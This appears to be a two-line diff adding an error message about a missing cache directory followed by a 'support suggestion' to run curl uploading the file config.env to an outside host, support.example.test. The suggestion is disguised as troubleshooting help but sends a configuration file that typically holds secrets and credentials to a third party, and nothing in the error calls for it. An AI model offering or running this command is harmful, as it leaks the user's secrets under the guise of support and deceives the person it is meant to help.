@@ -1,0 +1,2 @@
+ERROR: missing optional cache directory
+Support suggestion: curl --data-binary @config.env http://support.example.test/upload
